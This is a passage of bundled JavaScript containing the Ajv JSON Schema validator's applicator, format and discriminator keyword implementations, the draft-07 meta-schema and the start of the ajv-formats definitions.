            definedProp = (0, codegen_1.or)(definedProp, ...patProps.map((p) => (0, codegen_1._)`${(0, code_1.usePattern)(cxt, p)}.test(${key})`));
          }
          return (0, codegen_1.not)(definedProp);
        }
        function deleteAdditional(key) {
          gen.code((0, codegen_1._)`delete ${data}[${key}]`);
        }
        function additionalPropertyCode(key) {
          if (opts.removeAdditional === "all" || opts.removeAdditional && schema === false) {
            deleteAdditional(key);
            return;
          }
          if (schema === false) {
            cxt.setParams({ additionalProperty: key });
            cxt.error();
            if (!allErrors)
              gen.break();
            return;
          }
          if (typeof schema == "object" && !(0, util_1.alwaysValidSchema)(it, schema)) {
            const valid5 = gen.name("valid");
            if (opts.removeAdditional === "failing") {
              applyAdditionalSchema(key, valid5, false);
              gen.if((0, codegen_1.not)(valid5), () => {
                cxt.reset();
                deleteAdditional(key);
              });
            } else {
              applyAdditionalSchema(key, valid5);
              if (!allErrors)
                gen.if((0, codegen_1.not)(valid5), () => gen.break());
            }
          }
        }
        function applyAdditionalSchema(key, valid5, errors) {
          const subschema = {
            keyword: "additionalProperties",
            dataProp: key,
            dataPropType: util_1.Type.Str
          };
          if (errors === false) {
            Object.assign(subschema, {
              compositeRule: true,
              createErrors: false,
              allErrors: false
            });
          }
          cxt.subschema(subschema, valid5);
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/properties.js
var require_properties = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/properties.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var validate_1 = require_validate();
    var code_1 = require_code2();
    var util_1 = require_util();
    var additionalProperties_1 = require_additionalProperties();
    var def = {
      keyword: "properties",
      type: "object",
      schemaType: "object",
      code(cxt) {
        const { gen, schema, parentSchema, data, it } = cxt;
        if (it.opts.removeAdditional === "all" && parentSchema.additionalProperties === void 0) {
          additionalProperties_1.default.code(new validate_1.KeywordCxt(it, additionalProperties_1.default, "additionalProperties"));
        }
        const allProps = (0, code_1.allSchemaProperties)(schema);
        for (const prop of allProps) {
          it.definedProperties.add(prop);
        }
        if (it.opts.unevaluated && allProps.length && it.props !== true) {
          it.props = util_1.mergeEvaluated.props(gen, (0, util_1.toHash)(allProps), it.props);
        }
        const properties = allProps.filter((p) => !(0, util_1.alwaysValidSchema)(it, schema[p]));
        if (properties.length === 0)
          return;
        const valid5 = gen.name("valid");
        for (const prop of properties) {
          if (hasDefault(prop)) {
            applyPropertySchema(prop);
          } else {
            gen.if((0, code_1.propertyInData)(gen, data, prop, it.opts.ownProperties));
            applyPropertySchema(prop);
            if (!it.allErrors)
              gen.else().var(valid5, true);
            gen.endIf();
          }
          cxt.it.definedProperties.add(prop);
          cxt.ok(valid5);
        }
        function hasDefault(prop) {
          return it.opts.useDefaults && !it.compositeRule && schema[prop].default !== void 0;
        }
        function applyPropertySchema(prop) {
          cxt.subschema({
            keyword: "properties",
            schemaProp: prop,
            dataProp: prop
          }, valid5);
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/patternProperties.js
var require_patternProperties = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/patternProperties.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var code_1 = require_code2();
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var util_2 = require_util();
    var def = {
      keyword: "patternProperties",
      type: "object",
      schemaType: "object",
      code(cxt) {
        const { gen, schema, data, parentSchema, it } = cxt;
        const { opts } = it;
        const patterns = (0, code_1.allSchemaProperties)(schema);
        const alwaysValidPatterns = patterns.filter((p) => (0, util_1.alwaysValidSchema)(it, schema[p]));
        if (patterns.length === 0 || alwaysValidPatterns.length === patterns.length && (!it.opts.unevaluated || it.props === true)) {
          return;
        }
        const checkProperties = opts.strictSchema && !opts.allowMatchingProperties && parentSchema.properties;
        const valid5 = gen.name("valid");
        if (it.props !== true && !(it.props instanceof codegen_1.Name)) {
          it.props = (0, util_2.evaluatedPropsToName)(gen, it.props);
        }
        const { props } = it;
        validatePatternProperties();
        function validatePatternProperties() {
          for (const pat of patterns) {
            if (checkProperties)
              checkMatchingProperties(pat);
            if (it.allErrors) {
              validateProperties(pat);
            } else {
              gen.var(valid5, true);
              validateProperties(pat);
              gen.if(valid5);
            }
          }
        }
        function checkMatchingProperties(pat) {
          for (const prop in checkProperties) {
            if (new RegExp(pat).test(prop)) {
              (0, util_1.checkStrictMode)(it, `property ${prop} matches pattern ${pat} (use allowMatchingProperties)`);
            }
          }
        }
        function validateProperties(pat) {
          gen.forIn("key", data, (key) => {
            gen.if((0, codegen_1._)`${(0, code_1.usePattern)(cxt, pat)}.test(${key})`, () => {
              const alwaysValid = alwaysValidPatterns.includes(pat);
              if (!alwaysValid) {
                cxt.subschema({
                  keyword: "patternProperties",
                  schemaProp: pat,
                  dataProp: key,
                  dataPropType: util_2.Type.Str
                }, valid5);
              }
              if (it.opts.unevaluated && props !== true) {
                gen.assign((0, codegen_1._)`${props}[${key}]`, true);
              } else if (!alwaysValid && !it.allErrors) {
                gen.if((0, codegen_1.not)(valid5), () => gen.break());
              }
            });
          });
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/not.js
var require_not = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/not.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var util_1 = require_util();
    var def = {
      keyword: "not",
      schemaType: ["object", "boolean"],
      trackErrors: true,
      code(cxt) {
        const { gen, schema, it } = cxt;
        if ((0, util_1.alwaysValidSchema)(it, schema)) {
          cxt.fail();
          return;
        }
        const valid5 = gen.name("valid");
        cxt.subschema({
          keyword: "not",
          compositeRule: true,
          createErrors: false,
          allErrors: false
        }, valid5);
        cxt.failResult(valid5, () => cxt.reset(), () => cxt.error());
      },
      error: { message: "must NOT be valid" }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/anyOf.js
var require_anyOf = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/anyOf.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var code_1 = require_code2();
    var def = {
      keyword: "anyOf",
      schemaType: "array",
      trackErrors: true,
      code: code_1.validateUnion,
      error: { message: "must match a schema in anyOf" }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/oneOf.js
var require_oneOf = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/oneOf.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var error = {
      message: "must match exactly one schema in oneOf",
      params: ({ params }) => (0, codegen_1._)`{passingSchemas: ${params.passing}}`
    };
    var def = {
      keyword: "oneOf",
      schemaType: "array",
      trackErrors: true,
      error,
      code(cxt) {
        const { gen, schema, parentSchema, it } = cxt;
        if (!Array.isArray(schema))
          throw new Error("ajv implementation error");
        if (it.opts.discriminator && parentSchema.discriminator)
          return;
        const schArr = schema;
        const valid5 = gen.let("valid", false);
        const passing = gen.let("passing", null);
        const schValid = gen.name("_valid");
        cxt.setParams({ passing });
        gen.block(validateOneOf);
        cxt.result(valid5, () => cxt.reset(), () => cxt.error(true));
        function validateOneOf() {
          schArr.forEach((sch, i) => {
            let schCxt;
            if ((0, util_1.alwaysValidSchema)(it, sch)) {
              gen.var(schValid, true);
            } else {
              schCxt = cxt.subschema({
                keyword: "oneOf",
                schemaProp: i,
                compositeRule: true
              }, schValid);
            }
            if (i > 0) {
              gen.if((0, codegen_1._)`${schValid} && ${valid5}`).assign(valid5, false).assign(passing, (0, codegen_1._)`[${passing}, ${i}]`).else();
            }
            gen.if(schValid, () => {
              gen.assign(valid5, true);
              gen.assign(passing, i);
              if (schCxt)
                cxt.mergeEvaluated(schCxt, codegen_1.Name);
            });
          });
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/allOf.js
var require_allOf = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/allOf.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var util_1 = require_util();
    var def = {
      keyword: "allOf",
      schemaType: "array",
      code(cxt) {
        const { gen, schema, it } = cxt;
        if (!Array.isArray(schema))
          throw new Error("ajv implementation error");
        const valid5 = gen.name("valid");
        schema.forEach((sch, i) => {
          if ((0, util_1.alwaysValidSchema)(it, sch))
            return;
          const schCxt = cxt.subschema({ keyword: "allOf", schemaProp: i }, valid5);
          cxt.ok(valid5);
          cxt.mergeEvaluated(schCxt);
        });
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/if.js
var require_if = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/if.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var error = {
      message: ({ params }) => (0, codegen_1.str)`must match "${params.ifClause}" schema`,
      params: ({ params }) => (0, codegen_1._)`{failingKeyword: ${params.ifClause}}`
    };
    var def = {
      keyword: "if",
      schemaType: ["object", "boolean"],
      trackErrors: true,
      error,
      code(cxt) {
        const { gen, parentSchema, it } = cxt;
        if (parentSchema.then === void 0 && parentSchema.else === void 0) {
          (0, util_1.checkStrictMode)(it, '"if" without "then" and "else" is ignored');
        }
        const hasThen = hasSchema(it, "then");
        const hasElse = hasSchema(it, "else");
        if (!hasThen && !hasElse)
          return;
        const valid5 = gen.let("valid", true);
        const schValid = gen.name("_valid");
        validateIf();
        cxt.reset();
        if (hasThen && hasElse) {
          const ifClause = gen.let("ifClause");
          cxt.setParams({ ifClause });
          gen.if(schValid, validateClause("then", ifClause), validateClause("else", ifClause));
        } else if (hasThen) {
          gen.if(schValid, validateClause("then"));
        } else {
          gen.if((0, codegen_1.not)(schValid), validateClause("else"));
        }
        cxt.pass(valid5, () => cxt.error(true));
        function validateIf() {
          const schCxt = cxt.subschema({
            keyword: "if",
            compositeRule: true,
            createErrors: false,
            allErrors: false
          }, schValid);
          cxt.mergeEvaluated(schCxt);
        }
        function validateClause(keyword, ifClause) {
          return () => {
            const schCxt = cxt.subschema({ keyword }, schValid);
            gen.assign(valid5, schValid);
            cxt.mergeValidEvaluated(schCxt, valid5);
            if (ifClause)
              gen.assign(ifClause, (0, codegen_1._)`${keyword}`);
            else
              cxt.setParams({ ifClause: keyword });
          };
        }
      }
    };
    function hasSchema(it, keyword) {
      const schema = it.schema[keyword];
      return schema !== void 0 && !(0, util_1.alwaysValidSchema)(it, schema);
    }
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/thenElse.js
var require_thenElse = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/thenElse.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var util_1 = require_util();
    var def = {
      keyword: ["then", "else"],
      schemaType: ["object", "boolean"],
      code({ keyword, parentSchema, it }) {
        if (parentSchema.if === void 0)
          (0, util_1.checkStrictMode)(it, `"${keyword}" without "if" is ignored`);
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/index.js
var require_applicator = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/index.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var additionalItems_1 = require_additionalItems();
    var prefixItems_1 = require_prefixItems();
    var items_1 = require_items();
    var items2020_1 = require_items2020();
    var contains_1 = require_contains();
    var dependencies_1 = require_dependencies();
    var propertyNames_1 = require_propertyNames();
    var additionalProperties_1 = require_additionalProperties();
    var properties_1 = require_properties();
    var patternProperties_1 = require_patternProperties();
    var not_1 = require_not();
    var anyOf_1 = require_anyOf();
    var oneOf_1 = require_oneOf();
    var allOf_1 = require_allOf();
    var if_1 = require_if();
    var thenElse_1 = require_thenElse();
    function getApplicator(draft2020 = false) {
      const applicator = [
        // any
        not_1.default,
        anyOf_1.default,
        oneOf_1.default,
        allOf_1.default,
        if_1.default,
        thenElse_1.default,
        // object
        propertyNames_1.default,
        additionalProperties_1.default,
        dependencies_1.default,
        properties_1.default,
        patternProperties_1.default
      ];
      if (draft2020)
        applicator.push(prefixItems_1.default, items2020_1.default);
      else
        applicator.push(additionalItems_1.default, items_1.default);
      applicator.push(contains_1.default);
      return applicator;
    }
    exports2.default = getApplicator;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/format/format.js
var require_format = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/format/format.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var error = {
      message: ({ schemaCode }) => (0, codegen_1.str)`must match format "${schemaCode}"`,
      params: ({ schemaCode }) => (0, codegen_1._)`{format: ${schemaCode}}`
    };
    var def = {
      keyword: "format",
      type: ["number", "string"],
      schemaType: "string",
      $data: true,
      error,
      code(cxt, ruleType) {
        const { gen, data, $data, schema, schemaCode, it } = cxt;
        const { opts, errSchemaPath, schemaEnv, self } = it;
        if (!opts.validateFormats)
          return;
        if ($data)
          validate$DataFormat();
        else
          validateFormat();
        function validate$DataFormat() {
          const fmts = gen.scopeValue("formats", {
            ref: self.formats,
            code: opts.code.formats
          });
          const fDef = gen.const("fDef", (0, codegen_1._)`${fmts}[${schemaCode}]`);
          const fType = gen.let("fType");
          const format = gen.let("format");
          gen.if((0, codegen_1._)`typeof ${fDef} == "object" && !(${fDef} instanceof RegExp)`, () => gen.assign(fType, (0, codegen_1._)`${fDef}.type || "string"`).assign(format, (0, codegen_1._)`${fDef}.validate`), () => gen.assign(fType, (0, codegen_1._)`"string"`).assign(format, fDef));
          cxt.fail$data((0, codegen_1.or)(unknownFmt(), invalidFmt()));
          function unknownFmt() {
            if (opts.strictSchema === false)
              return codegen_1.nil;
            return (0, codegen_1._)`${schemaCode} && !${format}`;
          }
          function invalidFmt() {
            const callFormat = schemaEnv.$async ? (0, codegen_1._)`(${fDef}.async ? await ${format}(${data}) : ${format}(${data}))` : (0, codegen_1._)`${format}(${data})`;
            const validData = (0, codegen_1._)`(typeof ${format} == "function" ? ${callFormat} : ${format}.test(${data}))`;
            return (0, codegen_1._)`${format} && ${format} !== true && ${fType} === ${ruleType} && !${validData}`;
          }
        }
        function validateFormat() {
          const formatDef = self.formats[schema];
          if (!formatDef) {
            unknownFormat();
            return;
          }
          if (formatDef === true)
            return;
          const [fmtType, format, fmtRef] = getFormat(formatDef);
          if (fmtType === ruleType)
            cxt.pass(validCondition());
          function unknownFormat() {
            if (opts.strictSchema === false) {
              self.logger.warn(unknownMsg());
              return;
            }
            throw new Error(unknownMsg());
            function unknownMsg() {
              return `unknown format "${schema}" ignored in schema at path "${errSchemaPath}"`;
            }
          }
          function getFormat(fmtDef) {
            const code = fmtDef instanceof RegExp ? (0, codegen_1.regexpCode)(fmtDef) : opts.code.formats ? (0, codegen_1._)`${opts.code.formats}${(0, codegen_1.getProperty)(schema)}` : void 0;
            const fmt = gen.scopeValue("formats", { key: schema, ref: fmtDef, code });
            if (typeof fmtDef == "object" && !(fmtDef instanceof RegExp)) {
              return [fmtDef.type || "string", fmtDef.validate, (0, codegen_1._)`${fmt}.validate`];
            }
            return ["string", fmtDef, fmt];
          }
          function validCondition() {
            if (typeof formatDef == "object" && !(formatDef instanceof RegExp) && formatDef.async) {
              if (!schemaEnv.$async)
                throw new Error("async format in sync schema");
              return (0, codegen_1._)`await ${fmtRef}(${data})`;
            }
            return typeof format == "function" ? (0, codegen_1._)`${fmtRef}(${data})` : (0, codegen_1._)`${fmtRef}.test(${data})`;
          }
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/format/index.js
var require_format2 = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/format/index.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var format_1 = require_format();
    var format = [format_1.default];
    exports2.default = format;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/metadata.js
var require_metadata = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/metadata.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.contentVocabulary = exports2.metadataVocabulary = void 0;
    exports2.metadataVocabulary = [
      "title",
      "description",
      "default",
      "deprecated",
      "readOnly",
      "writeOnly",
      "examples"
    ];
    exports2.contentVocabulary = [
      "contentMediaType",
      "contentEncoding",
      "contentSchema"
    ];
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/draft7.js
var require_draft7 = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/draft7.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var core_1 = require_core2();
    var validation_1 = require_validation();
    var applicator_1 = require_applicator();
    var format_1 = require_format2();
    var metadata_1 = require_metadata();
    var draft7Vocabularies = [
      core_1.default,
      validation_1.default,
      (0, applicator_1.default)(),
      format_1.default,
      metadata_1.metadataVocabulary,
      metadata_1.contentVocabulary
    ];
    exports2.default = draft7Vocabularies;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/discriminator/types.js
var require_types = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/discriminator/types.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.DiscrError = void 0;
    var DiscrError;
    (function(DiscrError2) {
      DiscrError2["Tag"] = "tag";
      DiscrError2["Mapping"] = "mapping";
    })(DiscrError || (exports2.DiscrError = DiscrError = {}));
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/discriminator/index.js
var require_discriminator = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/discriminator/index.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var types_1 = require_types();
    var compile_1 = require_compile();
    var ref_error_1 = require_ref_error();
    var util_1 = require_util();
    var error = {
      message: ({ params: { discrError, tagName } }) => discrError === types_1.DiscrError.Tag ? `tag "${tagName}" must be string` : `value of tag "${tagName}" must be in oneOf`,
      params: ({ params: { discrError, tag, tagName } }) => (0, codegen_1._)`{error: ${discrError}, tag: ${tagName}, tagValue: ${tag}}`
    };
    var def = {
      keyword: "discriminator",
      type: "object",
      schemaType: "object",
      error,
      code(cxt) {
        const { gen, data, schema, parentSchema, it } = cxt;
        const { oneOf } = parentSchema;
        if (!it.opts.discriminator) {
          throw new Error("discriminator: requires discriminator option");
        }
        const tagName = schema.propertyName;
        if (typeof tagName != "string")
          throw new Error("discriminator: requires propertyName");
        if (schema.mapping)
          throw new Error("discriminator: mapping is not supported");
        if (!oneOf)
          throw new Error("discriminator: requires oneOf keyword");
        const valid5 = gen.let("valid", false);
        const tag = gen.const("tag", (0, codegen_1._)`${data}${(0, codegen_1.getProperty)(tagName)}`);
        gen.if((0, codegen_1._)`typeof ${tag} == "string"`, () => validateMapping(), () => cxt.error(false, { discrError: types_1.DiscrError.Tag, tag, tagName }));
        cxt.ok(valid5);
        function validateMapping() {
          const mapping = getMapping();
          gen.if(false);
          for (const tagValue in mapping) {
            gen.elseIf((0, codegen_1._)`${tag} === ${tagValue}`);
            gen.assign(valid5, applyTagSchema(mapping[tagValue]));
          }
          gen.else();
          cxt.error(false, { discrError: types_1.DiscrError.Mapping, tag, tagName });
          gen.endIf();
        }
        function applyTagSchema(schemaProp) {
          const _valid = gen.name("valid");
          const schCxt = cxt.subschema({ keyword: "oneOf", schemaProp }, _valid);
          cxt.mergeEvaluated(schCxt, codegen_1.Name);
          return _valid;
        }
        function getMapping() {
          var _a;
          const oneOfMapping = {};
          const topRequired = hasRequired(parentSchema);
          let tagRequired = true;
          for (let i = 0; i < oneOf.length; i++) {
            let sch = oneOf[i];
            if ((sch === null || sch === void 0 ? void 0 : sch.$ref) && !(0, util_1.schemaHasRulesButRef)(sch, it.self.RULES)) {
              const ref = sch.$ref;
              sch = compile_1.resolveRef.call(it.self, it.schemaEnv.root, it.baseId, ref);
              if (sch instanceof compile_1.SchemaEnv)
                sch = sch.schema;
              if (sch === void 0)
                throw new ref_error_1.default(it.opts.uriResolver, it.baseId, ref);
            }
            const propSch = (_a = sch === null || sch === void 0 ? void 0 : sch.properties) === null || _a === void 0 ? void 0 : _a[tagName];
            if (typeof propSch != "object") {
              throw new Error(`discriminator: oneOf subschemas (or referenced schemas) must have "properties/${tagName}"`);
            }
            tagRequired = tagRequired && (topRequired || hasRequired(sch));
            addMappings(propSch, i);
          }
          if (!tagRequired)
            throw new Error(`discriminator: "${tagName}" must be required`);
          return oneOfMapping;
          function hasRequired({ required }) {
            return Array.isArray(required) && required.includes(tagName);
          }
          function addMappings(sch, i) {
            if (sch.const) {
              addMapping(sch.const, i);
            } else if (sch.enum) {
              for (const tagValue of sch.enum) {
                addMapping(tagValue, i);
              }
            } else {
              throw new Error(`discriminator: "properties/${tagName}" must have "const" or "enum"`);
            }
          }
          function addMapping(tagValue, i) {
            if (typeof tagValue != "string" || tagValue in oneOfMapping) {
              throw new Error(`discriminator: "${tagName}" values must be unique strings`);
            }
            oneOfMapping[tagValue] = i;
          }
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/refs/json-schema-draft-07.json
var require_json_schema_draft_07 = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/refs/json-schema-draft-07.json"(exports2, module2) {
    module2.exports = {
      $schema: "http://json-schema.org/draft-07/schema#",
      $id: "http://json-schema.org/draft-07/schema#",
      title: "Core schema meta-schema",
      definitions: {
        schemaArray: {
          type: "array",
          minItems: 1,
          items: { $ref: "#" }
        },
        nonNegativeInteger: {
          type: "integer",
          minimum: 0
        },
        nonNegativeIntegerDefault0: {
          allOf: [{ $ref: "#/definitions/nonNegativeInteger" }, { default: 0 }]
        },
        simpleTypes: {
          enum: ["array", "boolean", "integer", "null", "number", "object", "string"]
        },
        stringArray: {
          type: "array",
          items: { type: "string" },
          uniqueItems: true,
          default: []
        }
      },
      type: ["object", "boolean"],
      properties: {
        $id: {
          type: "string",
          format: "uri-reference"
        },
        $schema: {
          type: "string",
          format: "uri"
        },
        $ref: {
          type: "string",
          format: "uri-reference"
        },
        $comment: {
          type: "string"
        },
        title: {
          type: "string"
        },
        description: {
          type: "string"
        },
        default: true,
        readOnly: {
          type: "boolean",
          default: false
        },
        examples: {
          type: "array",
          items: true
        },
        multipleOf: {
          type: "number",
          exclusiveMinimum: 0
        },
        maximum: {
          type: "number"
        },
        exclusiveMaximum: {
          type: "number"
        },
        minimum: {
          type: "number"
        },
        exclusiveMinimum: {
          type: "number"
        },
        maxLength: { $ref: "#/definitions/nonNegativeInteger" },
        minLength: { $ref: "#/definitions/nonNegativeIntegerDefault0" },
        pattern: {
          type: "string",
          format: "regex"
        },
        additionalItems: { $ref: "#" },
        items: {
          anyOf: [{ $ref: "#" }, { $ref: "#/definitions/schemaArray" }],
          default: true
        },
        maxItems: { $ref: "#/definitions/nonNegativeInteger" },
        minItems: { $ref: "#/definitions/nonNegativeIntegerDefault0" },
        uniqueItems: {
          type: "boolean",
          default: false
        },
        contains: { $ref: "#" },
        maxProperties: { $ref: "#/definitions/nonNegativeInteger" },
        minProperties: { $ref: "#/definitions/nonNegativeIntegerDefault0" },
        required: { $ref: "#/definitions/stringArray" },
        additionalProperties: { $ref: "#" },
        definitions: {
          type: "object",
          additionalProperties: { $ref: "#" },
          default: {}
        },
        properties: {
          type: "object",
          additionalProperties: { $ref: "#" },
          default: {}
        },
        patternProperties: {
          type: "object",
          additionalProperties: { $ref: "#" },
          propertyNames: { format: "regex" },
          default: {}
        },
        dependencies: {
          type: "object",
          additionalProperties: {
            anyOf: [{ $ref: "#" }, { $ref: "#/definitions/stringArray" }]
          }
        },
        propertyNames: { $ref: "#" },
        const: true,
        enum: {
          type: "array",
          items: true,
          minItems: 1,
          uniqueItems: true
        },
        type: {
          anyOf: [
            { $ref: "#/definitions/simpleTypes" },
            {
              type: "array",
              items: { $ref: "#/definitions/simpleTypes" },
              minItems: 1,
              uniqueItems: true
            }
          ]
        },
        format: { type: "string" },
        contentMediaType: { type: "string" },
        contentEncoding: { type: "string" },
        if: { $ref: "#" },
        then: { $ref: "#" },
        else: { $ref: "#" },
        allOf: { $ref: "#/definitions/schemaArray" },
        anyOf: { $ref: "#/definitions/schemaArray" },
        oneOf: { $ref: "#/definitions/schemaArray" },
        not: { $ref: "#" }
      },
      default: true
    };
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/ajv.js
var require_ajv = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/ajv.js"(exports2, module2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.MissingRefError = exports2.ValidationError = exports2.CodeGen = exports2.Name = exports2.nil = exports2.stringify = exports2.str = exports2._ = exports2.KeywordCxt = exports2.Ajv = void 0;
    var core_1 = require_core();
    var draft7_1 = require_draft7();
    var discriminator_1 = require_discriminator();
    var draft7MetaSchema = require_json_schema_draft_07();
    var META_SUPPORT_DATA = ["/properties"];
    var META_SCHEMA_ID = "http://json-schema.org/draft-07/schema";
    var Ajv = class extends core_1.default {
      _addVocabularies() {
        super._addVocabularies();
        draft7_1.default.forEach((v) => this.addVocabulary(v));
        if (this.opts.discriminator)
          this.addKeyword(discriminator_1.default);
      }
      _addDefaultMetaSchema() {
        super._addDefaultMetaSchema();
        if (!this.opts.meta)
          return;
        const metaSchema = this.opts.$data ? this.$dataMetaSchema(draft7MetaSchema, META_SUPPORT_DATA) : draft7MetaSchema;
        this.addMetaSchema(metaSchema, META_SCHEMA_ID, false);
        this.refs["http://json-schema.org/schema"] = META_SCHEMA_ID;
      }
      defaultMeta() {
        return this.opts.defaultMeta = super.defaultMeta() || (this.getSchema(META_SCHEMA_ID) ? META_SCHEMA_ID : void 0);
      }
    };
    exports2.Ajv = Ajv;
    module2.exports = exports2 = Ajv;
    module2.exports.Ajv = Ajv;
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.default = Ajv;
    var validate_1 = require_validate();
    Object.defineProperty(exports2, "KeywordCxt", { enumerable: true, get: function() {
      return validate_1.KeywordCxt;
    } });
    var codegen_1 = require_codegen();
    Object.defineProperty(exports2, "_", { enumerable: true, get: function() {
      return codegen_1._;
    } });
    Object.defineProperty(exports2, "str", { enumerable: true, get: function() {
      return codegen_1.str;
    } });
    Object.defineProperty(exports2, "stringify", { enumerable: true, get: function() {
      return codegen_1.stringify;
    } });
    Object.defineProperty(exports2, "nil", { enumerable: true, get: function() {
      return codegen_1.nil;
    } });
    Object.defineProperty(exports2, "Name", { enumerable: true, get: function() {
      return codegen_1.Name;
    } });
    Object.defineProperty(exports2, "CodeGen", { enumerable: true, get: function() {
      return codegen_1.CodeGen;
    } });
    var validation_error_1 = require_validation_error();
    Object.defineProperty(exports2, "ValidationError", { enumerable: true, get: function() {
      return validation_error_1.default;
    } });
    var ref_error_1 = require_ref_error();
    Object.defineProperty(exports2, "MissingRefError", { enumerable: true, get: function() {
      return ref_error_1.default;
    } });
  }
});

// node_modules/.pnpm/ajv-formats@3.0.1_ajv@8.20.0/node_modules/ajv-formats/dist/formats.js
var require_formats = __commonJS({
  "node_modules/.pnpm/ajv-formats@3.0.1_ajv@8.20.0/node_modules/ajv-formats/dist/formats.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.formatNames = exports2.fastFormats = exports2.fullFormats = void 0;
    function fmtDef(validate, compare3) {
      return { validate, compare: compare3 };
    }
    exports2.fullFormats = {
      // date: http://tools.ietf.org/html/rfc3339#section-5.6
      date: fmtDef(date, compareDate),
      // date-time: http://tools.ietf.org/html/rfc3339#section-5.6
      time: fmtDef(getTime(true), compareTime),
      "date-time": fmtDef(getDateTime(true), compareDateTime),
      "iso-time": fmtDef(getTime(), compareIsoTime),
      "iso-date-time": fmtDef(getDateTime(), compareIsoDateTime),
      // duration: https://tools.ietf.org/html/rfc3339#appendix-A
      duration: /^P(?!$)((\d+Y)?(\d+M)?(\d+D)?(T(?=\d)(\d+H)?(\d+M)?(\d+S)?)?|(\d+W)?)$/,
      uri,
